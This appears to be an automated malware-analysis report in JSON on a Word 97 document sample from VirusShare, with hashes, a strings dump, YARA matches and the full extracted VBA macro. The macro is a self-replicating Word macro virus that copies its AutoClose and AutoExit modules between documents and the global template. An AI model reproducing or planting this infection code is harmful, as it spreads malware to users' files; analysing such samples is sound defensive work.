{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoClose\"",
            "Attribute VB_Name = \"AutoExit\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoExit": "Runs when the Word document is closed",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str"
        },
        "macro": "\n\n\nPublic Sub MAIN()\n    Infectar\nEnd Sub\n\nPrivate Sub Infectar()\nDim Infectado\nInfectado = VerificaVitima(0)\nIf Infectado = 0 Then\n    WordBasic.MacroCopy WordBasic.[WindowName$]() + \":AutoClose\", \"Global:AutoClose\"\n    WordBasic.MacroCopy WordBasic.[WindowName$]() + \":AutoExit\", \"Global:AutoExit\"\nElse\n    Infectado = VerificaVitima(1)\n    If Infectado = 0 Then\n\n        WordBasic.MacroCopy \"Global:AutoClose\", WordBasic.[WindowName$]() + \":AutoClose\"\n        WordBasic.MacroCopy \"Global:AutoExit\", WordBasic.[WindowName$]() + \":AutoExit\"\n    End If\nEnd If\nEnd Sub\n\nPrivate Function VerificaVitima(Contexto)\nDim QtdadeMacros\nDim Infectado\nDim MAP0997\nDim i\n    QtdadeMacros = WordBasic.CountMacros(Contexto)\n    Infectado = 0\n    MAP0997 = 0\n    If QtdadeMacros > 0 Then\n        For i = 1 To QtdadeMacros\n            If WordBasic.[MacroName$](i, Contexto) = \"AutoClose\" Or MAP0997 = 1 Then\n                MAP0997 = 1\n                If WordBasic.[MacroName$](i, Contexto) = \"AutoExit\" Then\n                    Infectado = 1\n                End If\n            End If\n        Next\n    End If\n    VerificaVitima = Infectado\nEnd Function\n\n\n\nPrivate Sub Mensagem()\nDim Atraso\nDim fim\n    If (WordBasic.Day(WordBasic.Now()) = 28 And WordBasic.Month(WordBasic.Now()) = 7) Then\n        WordBasic.MsgBox \"Parab\u00e9ns para mim! \", \"Meu anivers\u00e1rio\", -8\n        Atraso = 3\n    Else\n        WordBasic.MsgBox \"Fechando 2807M! \", \"Nova V\u00edtima\", -8\n        Atraso = 1\n    End If\n    fim = WordBasic.Second(WordBasic.Now()) + 1\n    While WordBasic.Second(WordBasic.Now()) <> fim\n    Wend\nEnd Sub\n"
    },
    "filename": "VirusShare_440ae93ca9760e9a08b5bad00876fb30",
    "filesize": 40448,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Template: Normal.dot, Last Saved By: xx, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Mon Mar 27 14:58:00 2000, Last Saved Time/Date: Fri Apr 14 12:52:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "440ae93ca9760e9a08b5bad00876fb30",
        "sha1": "0122cf4b301a59cecc6beaf9378c1a941826afbd",
        "sha256": "52d37e4866bf84f16cd49e54024722329e567bff023f19b3d500ce1a180437cb"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "00000000000000000000000000000000000000000000000000000000000000000000000000000000",
            "  00000000 ",
            ". A!n",
            "bjbjWW",
            "C&tsD",
            "Normal.dot",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            ":AutoClose",
            "Global:AutoClose ",
            ":AutoExit",
            "Global:AutoExit",
            "Global:AutoClose ",
            ":AutoClose",
            "Global:AutoExit",
            ":AutoExit",
            "AutoClose",
            "AutoExit",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oClose\"",
            "Publi",
            "c Sub MAIN()",
            "Infectar`",
            "Vrxiva",
            "Verifi",
            "caVitimad(0",
            "!0  Then",
            "rdBasic.",
            "MacroCop",
            "[Wind",
            "$]() ",
            "+ \":",
            ", \"Global",
            "9UExit\"",
            "\tlse,t1",
            "yd,,D8",
            "X=A+AIfC",
            "IFuncti",
            "on ~Cont0exto",
            "dadeys",
            "MAP099z7",
            ".Count",
            ",\ti0",
            "For i",
            "1 To ",
            "#JEG",
            "Parabns para mim! ",
            "Meu aniversrio",
            "acro",
            "Fechando 2807M! ",
            "Nova Vtima",
            "  If",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oExit\"",
            "Priva",
            "Sub Mens",
            "agem()",
            "Dim Atra",
            "If (Wo",
            "rdBasic.",
            "Now(",
            "28 An",
            "NMonth",
            ")7) Then",
            "3sgBox",
            " \"Parab",
            "ns p",
            "m! \", \"M",
            "eu anive@rsrio",
            "3\tEl",
            "2Fech",
            "ando 280",
            "7M0Nova @Vtima.1.",
            ";0@Second}+ ",
            "While",
            "<> Wen0d",
            "838f70661",
            "438f70653",
            "538f70653",
            "DEST",
            "DEST",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "Normal",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "Modulo1",
            "AutoClose",
            "MAIN,",
            "Infectar",
            "InfectadoWc",
            "VerificaVitima",
            "WordBasic",
            "MacroCopyE",
            "WindowName$",
            "ContextoNs",
            "QtdadeMacrosdD",
            "MAP09971",
            "CountMacros",
            "MacroName$",
            "AutoExit",
            "Mensagem",
            "AtrasoM",
            "fimv",
            "Now%",
            "Month",
            "MsgBoxR",
            "Seconds",
            "Documentj",
            "Normal",
            "stdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WINDOWS\\",
            "SYSTEM\\S",
            "TDOLE2.T",
            " Automation",
            "MSF!ms>",
            "25FC9141",
            "-1206-11 D4-87",
            "44455354",
            "3.TWD#Mi",
            "crosoft ",
            "` Obje",
            "ct Libra",
            "P4,PJP \\VBE\\(EX",
            "ACxOffic",
            "DxO@uf",
            "Bx+,DF8",
            "D04C-5BF",
            "A-101B-BHDE5@xAA@w4",
            "UPROGR",
            "AMMI\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCHY\" 8.0Y",
            "BThisDoc@ument",
            "h@5sD",
            "C lose",
            "Exi`",
            "DEST",
            "Normal",
            "ThisDocument",
            "Modulo1",
            "AutoClose",
            "AutoExit",
            "C:\\PROGRAMMI\\FILE COMUNI\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Programmi\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "DEST",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "DEST",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAMMI\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "DEST",
            "DEST",
            "Document",
            "ThisDocument",
            "AutoClose",
            "AutoExit",
            "ID=\"{CD46DAAF-120B-11D4-8706-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoClose",
            "Module=AutoExit",
            "Name=\"Normal\"",
            "HelpContextID=\"0\"",
            "CMG=\"969419B539DDCBE1CBE1CBE1CBE1\"",
            "DPB=\"2C2EA32BAFC0B0C0B0C0\"",
            "GC=\"CFCD40FF4001E202E2021D\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "AutoClose=0, 0, 0, 0, C",
            "AutoExit=0, 0, 0, 0, C",
            "Documento Microsoft Word",
            "MSWordDoc",
            "Word.Document.8",
            " PAGE ",
            "A seguito di",
            "Affettuosi saluti",
            "All'attenzione di",
            "Alla cortese attenzione di",
            "Autore ",
            " AUTHOR ",
            "Autore ultimo salvataggio ",
            " LASTSAVEDBY ",
            " AUTHOR ",
            "\tPagina ",
            " PAGE ",
            " DATE ",
            "Con affetto",
            "Con i migliori auguri",
            "Con i migliori saluti",
            "Con ossequi",
            "Con osservanza",
            "Cordiali saluti",
            "Cordialmente",
            "Data creazione ",
            " CREATEDATE ",
            "Data ultima stampa ",
            " PRINTDATE ",
            "Distinti saluti",
            "Egregio Signore,",
            "ESPRESSO",
            "Gentile Signora,",
            "Gentile Signore,",
            "Grazie",
            "I pi cordiali saluti",
            "In riferimento a",
            "In risposta a",
            " FILENAME ",
            " FILENAME \\p ",
            "Oggetto:",
            "Pagina ",
            " PAGE ",
            " di ",
            " NUMPAGES ",
            "PERSONALE",
            "POSTA AEREA",
            "RACCOMANDATA",
            "Riservato\tPagina ",
            " PAGE ",
            " DATE ",
            "Stammi bene",
            "Ti ringrazio",
            ". A!n"
        ],
        "file": {
            "C:\\PROGRAMMI\\FILE COMUNI\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAMMI\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Programmi\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen"
        },
        "fuzzing": {
            "String too long": [
                "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.288924",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
